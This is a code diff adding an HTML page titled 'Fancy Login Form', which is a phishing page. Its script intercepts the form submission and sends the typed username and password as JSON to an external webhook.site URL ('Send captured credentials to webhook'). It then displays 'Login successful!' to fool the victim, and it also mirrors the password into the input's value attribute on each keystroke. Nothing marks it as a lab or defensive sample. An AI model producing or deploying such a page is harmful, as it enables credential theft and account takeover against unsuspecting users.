@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Fancy Login Form</title>
+        <link rel="stylesheet" href="css/ocean.css">
+        <link rel="apple-touch-icon" sizes="180x180" href="/img/apple-touch-icon.png">
+        <link rel="icon" type="image/png" sizes="32x32" href="/img/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/img/favicon-16x16.png">
+        <link rel="manifest" href="/img/site.webmanifest">
+    </head>
+    <body>
+        <a class="random-theme" href="/">Random Theme</a>
+        <div class="loginbox">
+            <h2 class="login">Login</h2>
+            <p class="error"></p>
+            <form id="fake-login-form">
+                <label for="username">Username:</label>
+                <input id="username" type="text" name="username" placeholder="Type username">
+                <label for="password">Password:</label>
+                <input id="password" type="password" name="password" placeholder="Type password">
+                <label for="login"></label>
+                <input id="login" type="submit" name="login" value="Login">
+            </form>
+        </div>
+
+        <script>
+            const form = document.getElementById('fake-login-form');
+            form.addEventListener('submit', async (e) => {
+                e.preventDefault(); // Prevent default form submission
+
+                const username = document.getElementById('username').value;
+                const password = document.getElementById('password').value;
+
+                // Send captured credentials to webhook
+                const webhookUrl = 'https://webhook.site/ebe21049-b774-4912-893b-62d3e2c5029c'; // Replace with your actual webhook
+                const data = {
+                    username: username,
+                    password: password
+                };
+
+                try {
+                    await fetch(webhookUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(data)
+                    });
+                    // Optional: Simulate a successful login or show an error to mimic the real page
+                    document.querySelector('.error').textContent = 'Login successful!'; // Or redirect if needed
+                } catch (error) {
+                    console.error('Error sending data:', error);
+                    document.querySelector('.error').textContent = 'An error occurred.';
+                }
+            });
+
+            const inp = document.getElementById("password");
+            inp.addEventListener("keyup", (e) => {
+                inp.setAttribute('value', inp.value);
+            });
+        </script>
+    </body>
+</html>
